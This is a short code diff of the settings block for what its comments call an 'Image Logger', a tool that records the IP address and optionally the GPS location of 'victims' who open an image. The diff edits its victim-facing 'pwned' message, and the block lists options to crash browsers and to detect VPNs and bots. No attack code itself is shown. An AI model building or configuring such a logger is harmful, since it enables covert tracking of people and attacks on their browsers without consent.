@@ -24,13 +24,10 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Crashes the victim's browser (may not work on all browsers)
     "accurateLocation": False, # Uses GPS to get the victim's location (will ask for permission)
-    "message": { # Show a custom message when the victim opens the image (set to None to disable)
-        "title": "Image Logger",
-        "description": "Your IP has been logged",
-        "image": "![image](https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png)",
-        "color": 12452044,
-        "footer": "Image Logger",
-        "footer_icon": "![image](https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png)"
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by C00lB0i's Image Logger. ", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
     "vpnCheck": True, # Check if the victim is using a VPN (may not be accurate)
     "botCheck": True, # Check if the victim is a bot (may not be accurate)
